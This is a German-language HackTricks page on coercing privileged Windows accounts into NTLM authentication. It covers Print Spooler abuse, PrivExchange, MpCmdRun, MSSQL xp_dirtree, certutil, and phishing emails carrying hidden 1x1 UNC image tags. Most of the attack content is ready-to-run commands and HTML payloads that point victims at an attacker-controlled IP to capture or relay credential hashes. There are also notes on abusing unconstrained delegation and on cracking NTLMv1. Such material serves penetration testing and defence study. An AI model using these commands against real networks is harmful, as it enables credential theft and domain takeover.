# Erzwingen der privilegierten NTLM-Authentifizierung

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von in C# codierten **Remote-Authentifizierungstriggern**, die den MIDL-Compiler verwenden, um von Drittanbieterabhängigkeiten abzusehen.

## Missbrauch des Spooler-Dienstes

Wenn der _**Print Spooler**_-Dienst **aktiviert** ist, können Sie einige bereits bekannte AD-Anmeldeinformationen verwenden, um vom Druckserver des Domänencontrollers eine **Aktualisierung** zu neuen Druckaufträgen anzufordern und ihm einfach mitzuteilen, dass er die Benachrichtigung an ein bestimmtes System **senden** soll.\
Beachten Sie, dass, wenn der Drucker die Benachrichtigung an ein beliebiges System sendet, es sich gegen dieses **System authentifizieren** muss. Daher kann ein Angreifer den _**Print Spooler**_-Dienst dazu bringen, sich gegen ein beliebiges System zu authentifizieren, und der Dienst wird dabei das Computerkonto verwenden.

### Suche nach Windows-Servern in der Domäne

Verwenden Sie PowerShell, um eine Liste der Windows-Boxen zu erhalten. Server haben normalerweise Priorität, daher konzentrieren wir uns darauf:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Ermittlung von Spooler-Diensten, die zuhören

Verwenden Sie eine leicht modifizierte Version von @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), um festzustellen, ob der Spooler-Dienst zuhört:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Sie können rpcdump.py auch unter Linux verwenden und nach dem MS-RPRN-Protokoll suchen.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Fordern Sie den Dienst auf, sich gegen einen beliebigen Host zu authentifizieren

Sie können **SpoolSample von hier** kompilieren (https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oder verwenden Sie [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn Sie Linux verwenden.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombination mit uneingeschränkter Delegation

Wenn ein Angreifer bereits einen Computer mit [uneingeschränkter Delegation](unconstrained-delegation.md) kompromittiert hat, kann der Angreifer den Drucker dazu bringen, sich gegen diesen Computer zu authentifizieren. Aufgrund der uneingeschränkten Delegation wird das **TGT** des **Computerkontos des Druckers** im **Speicher** des Computers mit uneingeschränkter Delegation gespeichert. Da der Angreifer bereits diesen Host kompromittiert hat, kann er dieses Ticket abrufen und missbrauchen ([Pass the Ticket](pass-the-ticket.md)).

## RCP Force-Authentifizierung

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Der `PrivExchange`-Angriff ist das Ergebnis einer Schwachstelle im **Exchange Server `PushSubscription`-Feature**. Diese Funktion ermöglicht es dem Exchange-Server, von jedem Domänenbenutzer mit einem Postfach erzwungen zu werden, sich über HTTP bei einem beliebigen vom Client bereitgestellten Host zu authentifizieren.

Standardmäßig läuft der **Exchange-Dienst als SYSTEM** und hat übermäßige Berechtigungen (insbesondere hat er **WriteDacl-Berechtigungen auf der Domäne vor dem kumulativen Update 2019**). Diese Schwachstelle kann ausgenutzt werden, um das **Weiterleiten von Informationen an LDAP zu ermöglichen und anschließend die NTDS-Datenbank der Domäne zu extrahieren**. In Fällen, in denen das Weiterleiten an LDAP nicht möglich ist, kann diese Schwachstelle dennoch zum Weiterleiten und zur Authentifizierung bei anderen Hosts in der Domäne verwendet werden. Die erfolgreiche Ausnutzung dieses Angriffs gewährt sofortigen Zugriff auf den Domänenadministrator mit einem beliebigen authentifizierten Domänenbenutzerkonto.

## Innerhalb von Windows

Wenn Sie bereits innerhalb der Windows-Maschine sind, können Sie Windows zwingen, sich mit privilegierten Konten mit einem Server zu verbinden:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL (Microsoft SQL Server) ist ein relationales Datenbankverwaltungssystem, das von Microsoft entwickelt wurde. Es wird häufig in Unternehmen eingesetzt und bietet eine Vielzahl von Funktionen für die Speicherung und Verwaltung von Daten. MSSQL verwendet die SQL-Sprache (Structured Query Language) für die Abfrage und Manipulation von Daten. Es bietet auch erweiterte Funktionen wie Transaktionsverarbeitung, Sicherheit und Skalierbarkeit. MSSQL kann sowohl lokal als auch in der Cloud verwendet werden und ist mit verschiedenen Betriebssystemen kompatibel, einschließlich Windows und Linux.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Oder verwenden Sie diese andere Technik: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, das lolbin-Zertifikat certutil.exe (Microsoft-signierte Binärdatei) zur Erzwingung der NTLM-Authentifizierung zu verwenden:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML-Injektion

### Über E-Mail

Wenn Sie die **E-Mail-Adresse** des Benutzers kennen, der sich in einer Maschine anmeldet, die Sie kompromittieren möchten, können Sie ihm einfach eine **E-Mail mit einem 1x1-Bild** senden, wie zum Beispiel
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

Wenn Sie einen MitM-Angriff auf einen Computer durchführen können und HTML-Code in einer Seite einschleusen können, die er visualisiert, könnten Sie versuchen, ein Bild wie das folgende in die Seite einzufügen:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Knacken von NTLMv1

Wenn Sie [NTLMv1-Herausforderungen erfassen, lesen Sie hier, wie Sie sie knacken können](../ntlm/#ntlmv1-attack).\
_Bedenken Sie, dass Sie zum Knacken von NTLMv1 die Responder-Herausforderung auf "1122334455667788" setzen müssen._

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>
